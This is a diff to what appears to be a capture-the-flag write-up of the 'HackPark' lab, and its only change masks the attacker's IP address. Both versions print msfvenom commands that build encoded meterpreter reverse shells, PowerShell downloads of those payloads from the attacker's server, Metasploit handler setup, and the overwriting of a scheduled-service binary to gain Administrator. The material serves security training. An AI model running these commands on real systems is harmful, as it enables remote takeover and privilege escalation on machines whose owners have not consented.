@@ -266,7 +266,7 @@ Tip: You can generate the reverse-shell payload using msfvenom, upload it using 
 Let's generate our executable with msfvenom (make sure you select a different port as the one used for the previous reverse shell):
 
 ~~~
-$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.54 LPORT=2345 -f exe -o revshell.exe
+$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.**.** LPORT=2345 -f exe -o revshell.exe
 ~~~
 
 Now, let's download the payload from the server. To do that, we'll first start a web server (from the same location where our exe is):
@@ -278,7 +278,7 @@ $ python3 -m http.server
 Now, on the reverse shell, enter the following command:
 
 ~~~
-powershell -c "Invoke-WebRequest -Uri 'http://10.9.0.54:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
+powershell -c "Invoke-WebRequest -Uri 'http://10.9.**.**:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
 ~~~
 
 Now, open `msfconsole`:
@@ -288,13 +288,13 @@ $ msfconsole -q
 msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) > set LHOST 10.9.0.54
-LHOST => 10.9.0.54
+msf5 exploit(multi/handler) > set LHOST 10.9.**.**
+LHOST => 10.9.**.**
 msf5 exploit(multi/handler) > set LPORT 2345
 LPORT => 2345
 msf5 exploit(multi/handler) > run
 
-[*] Started reverse TCP handler on 10.9.0.54:2345 
+[*] Started reverse TCP handler on 10.9.**.**:2345 
 ~~~
 
 Now, back to the reverse shell, let's start the executable:
@@ -331,7 +331,7 @@ In your `msfconsole`, you should now have a meterpreter:
 
 ~~~
 [*] Sending stage (176195 bytes) to 10.10.79.198
-[*] Meterpreter session 1 opened (10.9.0.54:2345 -> 10.10.79.198:54675) at 2020-05-17 16:05:38 +0200
+[*] Meterpreter session 1 opened (10.9.**.**:2345 -> 10.10.79.198:54675) at 2020-05-17 16:05:38 +0200
 
 meterpreter > 
 ~~~
@@ -565,7 +565,7 @@ meterpreter > cd jeff
 Time to replace `C:\Program Files (x86)\SystemScheduler\Message.exe` with a reverse shell. Let's first generate new reverse shell (use a new port) that we will name `Message.exe`:
 
 ~~~
-$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.54 LPORT=2345 -f exe -o Message.exe
+$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.**.** LPORT=2345 -f exe -o Message.exe
 $ python3 -m http.server
 ~~~
 
@@ -575,26 +575,26 @@ In Metasploit, configure the handler:
 msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) > set LHOST 10.9.0.54
-LHOST => 10.9.0.54
+msf5 exploit(multi/handler) > set LHOST 10.9.**.**
+LHOST => 10.9.**.**
 msf5 exploit(multi/handler) > set LPORT 3456
 LPORT => 3456
 msf5 exploit(multi/handler) > run
 
-[*] Started reverse TCP handler on 10.9.0.54:3456 
+[*] Started reverse TCP handler on 10.9.**.**:3456 
 ~~~
 
 In the existing reverse shell, download your new reverse shell:
 
 ~~~
-powershell -c "Invoke-WebRequest -Uri 'http://10.9.0.54:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
+powershell -c "Invoke-WebRequest -Uri 'http://10.9.**.**:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
 ~~~
 
 After some seconds, we have a meterpreter as `Administrator`:
 
 ~~~
 [*] Sending stage (176195 bytes) to 10.10.79.198
-[*] Meterpreter session 1 opened (10.9.0.54:3456 -> 10.10.79.198:52832) at 2020-05-17 19:19:03 +0200
+[*] Meterpreter session 1 opened (10.9.**.**:3456 -> 10.10.79.198:52832) at 2020-05-17 19:19:03 +0200
 
 meterpreter > getuid 
 Server username: HACKPARK\Administrator
@@ -654,7 +654,7 @@ $ python -m http.server
 In our reverse shell, we can now download WinPEAS:
 
 ~~~
-powershell -c "Invoke-WebRequest -Uri 'http://10.9.0.54:8000/WinPEAS.bat' -OutFile 'c:\windows\temp\winpeas.exe'"
+powershell -c "Invoke-WebRequest -Uri 'http://10.9.**.**:8000/WinPEAS.bat' -OutFile 'c:\windows\temp\winpeas.exe'"
 ~~~
 
 ## #5.3
